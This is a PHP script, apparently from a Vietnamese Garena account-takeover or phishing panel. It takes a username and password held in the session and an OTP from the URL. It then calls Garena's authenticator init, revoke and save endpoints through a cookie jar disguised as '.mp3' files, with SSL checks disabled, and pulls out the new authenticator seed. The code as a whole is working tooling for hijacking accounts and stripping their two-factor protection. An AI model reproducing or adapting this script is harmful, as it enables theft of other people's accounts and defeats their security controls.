<?php
include ('KetNoiDataBase.php');
$user_1 = $_SESSION['user'];
$pass_1 = $_SESSION['pass'];
$code_1 = $_GET['otp'];
$timee = time() * 1000;
if ($user_1 == '' or $pass_1 == '' or $code_1 == '')
{
    echo '{"id": "'.$timee.'", "code": 0, "error": "Vui lòng nhập mã xác thực"}';
    exit;    
}
$c = curl_init();
curl_setopt($c, CURLOPT_URL, "https://account.garena.com/api/account/authenticator/init");
curl_setopt($c, CURLOPT_SSL_VERIFYPEER, false);
curl_setopt($c, CURLOPT_SSL_VERIFYHOST, false);
curl_setopt($c, CURLOPT_FOLLOWLOCATION, true);
curl_setopt($c, CURLOPT_RETURNTRANSFER, true);
curl_setopt($c, CURLOPT_COOKIEJAR, dirname(__FILE__) . "/cookie/$user_1.mp3");
curl_setopt($c, CURLOPT_COOKIEFILE, dirname(__FILE__) . "/cookie/$user_1.mp3");
$xac_minh = curl_exec($c);
curl_close($c);
if (stristr($xac_minh,'"error_count":0'))
{
    $loginne = 2;
}else {
    if (file_exists("/cookie/$user_1.mp3"))
    {
    	unlink("/cookie/$user_1.mp3");
    }
    unset($_SESSION['xacminh']);
	unset($_SESSION['show']);
    echo '{"id": "'.$timee.'", "code": 1,  "link_ch": "index.php", "error": "Chưa xác định lỗi sai"}';
    exit;
}



$c = curl_init();
curl_setopt($c, CURLOPT_URL, "https://account.garena.com/api/account/authenticator/revoke");
curl_setopt($c, CURLOPT_SSL_VERIFYPEER, false);
curl_setopt($c, CURLOPT_SSL_VERIFYHOST, false);
curl_setopt($c, CURLOPT_FOLLOWLOCATION, true);
curl_setopt($c, CURLOPT_RETURNTRANSFER, true);
curl_setopt($c, CURLOPT_COOKIEJAR, dirname(__FILE__) . "/cookie/$user_1.mp3");
curl_setopt($c, CURLOPT_COOKIEFILE, dirname(__FILE__) . "/cookie/$user_1.mp3");
curl_setopt($c, CURLOPT_POST, 1);
curl_setopt($c, CURLOPT_POSTFIELDS, '{"code":"'.$code_1.'"}');
$rq4 = curl_exec($c);
curl_close($c);
$c = curl_init();
curl_setopt($c, CURLOPT_URL, "https://account.garena.com/api/account/authenticator/save");
curl_setopt($c, CURLOPT_SSL_VERIFYPEER, false);
curl_setopt($c, CURLOPT_SSL_VERIFYHOST, false);
curl_setopt($c, CURLOPT_FOLLOWLOCATION, true);
curl_setopt($c, CURLOPT_RETURNTRANSFER, true);
curl_setopt($c, CURLOPT_COOKIEJAR, dirname(__FILE__) . "/cookie/$user_1.mp3");
curl_setopt($c, CURLOPT_COOKIEFILE, dirname(__FILE__) . "/cookie/$user_1.mp3");
curl_setopt($c, CURLOPT_POST, 1);
curl_setopt($c, CURLOPT_POSTFIELDS, '{"code":"'.$code_1.'"}');
$rq5 = curl_exec($c);
curl_close($c);
$rq100 = json_decode($rq4, true);
$authen = $rq100['next_action']['verified_info']['seed'];

if (stristr($rq5,'"status":0'))
{
    
    if (file_exists("../login/cookie/$user_1.mp3"))
    {
    	unlink("../login/cookie/$user_1.mp3");
    }
    unset($_SESSION['xacminh']);
	unset($_SESSION['show']);
   
    echo '{"id": "'.$timee.'", "code": 55, "error": "Xác minh lại OTP"}';
    exit();
} 

if (stristr($rq4,'"status":2')){
	echo '{"id": "'.$timee.'", "code": 0, "error": "Mã xác thực không chính xác hoặc đã hết hạn"}'; 
	die();
}


else if (stristr($rq4,'"status":"0"')){
	echo '{"id": "'.$timee.'", "code": 55}'; 
	die();
}

else if (stristr($rq4,'"error":"error_action"')){
	echo '{"id": "'.$timee.'", "code": 0, "error": "Tài khoản này đã thu hồi ứng dụng"}'; 
	die();
}


else {
  echo '{"id": "'.$timee.'", "code": 55}'; 
}


function get_string_between($string, $start, $end){
    $string = ' ' . $string;
    $ini = strpos($string, $start);
    if ($ini == 0) return '';
    $ini += strlen($start);
    $len = strpos($string, $end, $ini) - $ini;
    return substr($string, $ini, $len);
}




?>